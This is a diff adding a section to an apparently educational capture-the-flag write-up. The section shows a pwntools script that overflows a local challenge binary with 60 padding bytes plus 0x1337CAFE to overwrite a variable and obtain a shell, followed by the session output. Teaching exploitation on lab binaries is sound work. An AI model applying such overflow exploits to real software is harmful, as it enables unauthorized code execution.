@@ -217,5 +217,43 @@ That's awesome, this means that the index of `89AB` is how many bytes we need to
 
 So, after `60` bytes we should be writing the desired value (`0x1337CAFE`). To encode it, we remember Intel uses [Little Endian](https://en.wikipedia.org/wiki/Endianness) to encode integers, so we reverse the order of bytes!
 
+## Getting a shell with pwntools
+The astute reader will notice we got the `woot` output, but no shell afterwards! What gives?  
+Well, the problem was that we used `printf` and piped the output to the challenge's `stdin`, so after overriding `magic` we simply finish - and `stdout` gets an `EOF` (end-of-file), which means the shell just quits.  
+This can be solved in numerous ways, but this is a nice excuse to introduce to one powerful tool - `pwntools`.  
+[Pwntools](https://docs.pwntools.com/en/stable/) is a Python library that helps automate a lot of the annoying boilerplate code you sometimes do for `pwn` challenges.  
+In our case, it'll let us talk to a process's `stdin`, as well as switch to an interactive `stdin` afterwards.  
+Here's the code for this challenge:
 
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+p = process('./chall')
+p.send(b'A' * 60 + struct.pack('<L', 0x1337CAFE) + b'\n')
+p.recvuntil(b'woot!\n')
+p.interactive()
+```
+
+What happened here:
+- Importing everything from `pwn`.
+- Creating a new `process` and assigning it to the variable `p`.
+- Sending `60` bytes of garbage ('A' characters) to the `stdin` followed by `0x1337CAFE` packed (using `struct` which is imported in `pwn`) and then an end-of-line - all of that using `p.send`.
+- Receiving output until we get `woot!` followed by a newline.
+- Moving to an interactive mode.
+
+The result is always fun:
+
+```shell
+$ ./solve.py
+[+] Starting local process './chall': pid 16133
+[*] Switching to interactive mode
+$ id
+uid=1000(jbo) gid=1000(jbo) groups=1000(jbo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
+$ exit
+[*] Got EOF while reading in interactive
+$ exit
+[*] Process './chall' stopped with exit code 0 (pid 16133)
+[*] Got EOF while sending in interactive
+```
 
